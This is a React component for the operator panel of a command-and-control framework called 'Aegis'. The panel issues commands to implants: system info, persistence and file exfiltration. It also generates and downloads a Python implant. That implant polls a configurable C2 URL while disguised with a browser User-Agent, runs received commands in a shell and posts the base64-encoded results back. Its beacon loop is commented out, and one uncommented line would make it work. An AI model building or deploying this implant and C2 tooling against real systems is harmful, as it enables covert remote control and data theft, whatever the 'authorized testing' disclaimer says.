import React, { useState } from 'react';
import { Implant, CommandType } from '../types';
import { TerminalIcon, DownloadIcon, PersistenceIcon, FileIcon } from './icons';

interface CommandPanelProps {
  selectedImplant: Implant | undefined;
  onSendCommand: (command: CommandType, args: string) => void;
}

const CommandPanel: React.FC<CommandPanelProps> = ({ selectedImplant, onSendCommand }) => {
  const [command, setCommand] = useState<CommandType>(CommandType.FILE_FETCH);
  const [args, setArgs] = useState('');
  const [c2Address, setC2Address] = useState('https://aegis-c2.example.com/api');
  const [isGenerating, setIsGenerating] = useState(false);
  
  const isArgsRequired = command === CommandType.FILE_FETCH;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedImplant) return;
    if (isArgsRequired && !args) return;
    onSendCommand(command, args);
    setArgs('');
  };

  const handleSysInfoClick = () => {
    if (!selectedImplant) return;
    onSendCommand(CommandType.SYSINFO, '');
  };

  const handlePersistUserClick = () => {
    if (!selectedImplant) return;
    onSendCommand(CommandType.PERSIST_USER, '');
  };

  const handleGenerateAndDownload = () => {
    setIsGenerating(true);

    // Simulate binary generation
    setTimeout(() => {
      const placeholderCode = `
# Aegis-Core Implant (Generated on ${new Date().toISOString()})
# WARNING: This tool is for authorized testing ONLY.
# Ensure you have explicit permission before use.

import requests
import time
import subprocess
import json
import base64
import random

# --- CONFIGURATION ---
# This MUST be configured to your C2 server address.
C2_URL = "${c2Address}"
BEACON_INTERVAL_MIN = 30
BEACON_INTERVAL_MAX = 90
# ---------------------

def run_command(command):
    # Basic implementation for command execution
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return output
    except Exception as e:
        return str(e)

def beacon():
    # Main beacon loop
    while True:
        try:
            # In a real implant, system info would be gathered here to identify the agent
            implant_id = "a7c8e9b0-1d2f-4a5b-8c9d-0e1f2a3b4c5d" # Hardcoded for PoC
            
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
            response = requests.get(f"{C2_URL}/tasks/{implant_id}", headers=headers)
            
            if response.status_code == 200:
                task = response.json()
                if task.get('command'):
                    result = run_command(f"{task['command']} {task['args']}")
                    
                    # Exfiltrate result
                    result_data = {'result': base64.b64encode(result.encode()).decode()}
                    requests.post(f"{C2_URL}/results/{task['id']}", json=result_data, headers=headers)

        except Exception as e:
            # In a real implant, errors would be handled silently
            pass
        
        # Pseudo-randomized sleep
        sleep_time = random.randint(BEACON_INTERVAL_MIN, BEACON_INTERVAL_MAX)
        time.sleep(sleep_time)

if __name__ == "__main__":
    # In a real scenario, this would perform sandbox checks first
    # beacon()
    print("This is a placeholder script. The main loop is disabled for safety.")
    print(f"C2 configured for: {C2_URL}")
`;
      const blob = new Blob([placeholderCode.trim()], { type: 'text/python' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'aegis_implant.py';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      
      setIsGenerating(false);
    }, 1500);
  };

  const commandPlaceholders: Record<string, string> = {
    [CommandType.FILE_FETCH]: "e.g., C:\\Users\\Public\\doc.txt",
  };
  
  const commandOptions = Object.values(CommandType).filter(
    c => c !== CommandType.SYSINFO && c !== CommandType.PERSIST_USER
  );
  
  const commandLabels: Record<string, string> = {
      [CommandType.FILE_FETCH]: "file_fetch - Exfiltrate a file",
  };

  const submitButtonText = command === CommandType.FILE_FETCH ? 'Fetch File' : 'Issue Advanced Command';

  return (
    <div className="bg-brand-surface border border-brand-border rounded-lg shadow-lg h-full flex flex-col">
      <div className="p-4 border-b border-brand-border">
        <h2 className="text-lg font-semibold text-gray-100">Command & Control</h2>
      </div>
      <div className="p-4 flex-grow">
        {selectedImplant ? (
          <div className="space-y-6 h-full flex flex-col">
            <div>
              <label htmlFor="implant-id" className="block text-sm font-medium text-brand-secondary">Target Implant</label>
              <input
                id="implant-id"
                type="text"
                readOnly
                value={`${selectedImplant.hostname} (${selectedImplant.ip})`}
                className="mt-1 block w-full bg-brand-bg border border-brand-border rounded-md shadow-sm py-2 px-3 text-gray-300 focus:outline-none focus:ring-brand-primary focus:border-brand-primary sm:text-sm"
              />
            </div>
            
            <div className="space-y-2">
                 <h3 className="text-sm font-medium text-brand-secondary">Quick Actions</h3>
                 <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <button
                        type="button"
                        onClick={handleSysInfoClick}
                        disabled={!selectedImplant}
                        className="w-full flex items-center justify-center py-2 px-4 border border-brand-border rounded-md shadow-sm text-sm font-medium text-gray-200 bg-brand-surface hover:bg-brand-border focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-brand-surface focus:ring-brand-primary disabled:bg-gray-800 disabled:text-gray-500 disabled:cursor-not-allowed transition-colors"
                    >
                        <TerminalIcon className="w-5 h-5 mr-2" />
                        Get System Info
                    </button>
                     <button
                        type="button"
                        onClick={handlePersistUserClick}
                        disabled={!selectedImplant}
                        className="w-full flex items-center justify-center py-2 px-4 border border-brand-border rounded-md shadow-sm text-sm font-medium text-gray-200 bg-brand-surface hover:bg-brand-border focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-brand-surface focus:ring-brand-primary disabled:bg-gray-800 disabled:text-gray-500 disabled:cursor-not-allowed transition-colors"
                    >
                        <PersistenceIcon className="w-5 h-5 mr-2" />
                        Establish Persistence
                    </button>
                 </div>
            </div>

            <div className="border-t border-brand-border/50"></div>

            <form onSubmit={handleSubmit} className="space-y-4 flex-grow flex flex-col">
              <div className="flex-grow space-y-4">
                <div>
                  <label htmlFor="command-type" className="block text-sm font-medium text-brand-secondary">Advanced Modules</label>
                  <select
                    id="command-type"
                    value={command}
                    onChange={(e) => {
                        setCommand(e.target.value as CommandType);
                        setArgs('');
                    }}
                    className="mt-1 block w-full bg-brand-bg border border-brand-border rounded-md shadow-sm py-2 px-3 text-gray-300 focus:outline-none focus:ring-brand-primary focus:border-brand-primary sm:text-sm"
                  >
                    {commandOptions.map(cmd => (
                        <option key={cmd} value={cmd}>
                           {commandLabels[cmd]}
                        </option>
                    ))}
                  </select>
                </div>
                {isArgsRequired && (
                  <div>
                    <label htmlFor="command-args" className="flex items-center text-sm font-medium text-brand-secondary">
                      {command === CommandType.FILE_FETCH && <FileIcon className="w-4 h-4 mr-2 text-brand-secondary" />}
                      Arguments
                    </label>
                    <input
                      id="command-args"
                      type="text"
                      value={args}
                      onChange={(e) => setArgs(e.target.value)}
                      placeholder={commandPlaceholders[command]}
                      className="mt-1 block w-full bg-brand-bg border border-brand-border rounded-md shadow-sm py-2 px-3 text-gray-300 focus:outline-none focus:ring-brand-primary focus:border-brand-primary sm:text-sm"
                    />
                  </div>
                )}
              </div>
              <button
                type="submit"
                disabled={!selectedImplant || (isArgsRequired && !args)}
                className="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-brand-primary hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-brand-bg focus:ring-brand-primary disabled:bg-gray-600 disabled:cursor-not-allowed"
              >
                {submitButtonText}
              </button>
            </form>
          </div>
        ) : (
          <div className="text-center py-12 text-brand-secondary flex items-center justify-center h-full">
            <p>Select an implant to issue commands.</p>
          </div>
        )}
      </div>

      <div className="border-t border-brand-border mt-auto">
        <div className="p-4 space-y-3">
            <h3 className="text-md font-semibold text-gray-200">Implant Generation</h3>
            <div>
                <label htmlFor="c2-address" className="block text-sm font-medium text-brand-secondary">
                    C2 Server Address (API Endpoint)
                </label>
                <input
                    id="c2-address"
                    type="text"
                    value={c2Address}
                    onChange={(e) => setC2Address(e.target.value)}
                    placeholder="https://your-c2.com/api"
                    className="mt-1 block w-full bg-brand-bg border border-brand-border rounded-md shadow-sm py-2 px-3 text-gray-300 focus:outline-none focus:ring-brand-primary focus:border-brand-primary sm:text-sm"
                />
            </div>
            <button
                type="button"
                onClick={handleGenerateAndDownload}
                disabled={isGenerating || !c2Address}
                className="w-full flex items-center justify-center py-2 px-4 border border-brand-border rounded-md shadow-sm text-sm font-medium text-gray-200 bg-brand-surface hover:bg-brand-border focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-brand-surface focus:ring-brand-primary disabled:bg-gray-800 disabled:text-gray-500 disabled:cursor-not-allowed transition-colors"
            >
                <DownloadIcon className="w-5 h-5 mr-2" />
                {isGenerating ? 'Generating...' : 'Generate & Download Implant'}
            </button>
        </div>
      </div>
    </div>
  );
};

export default CommandPanel;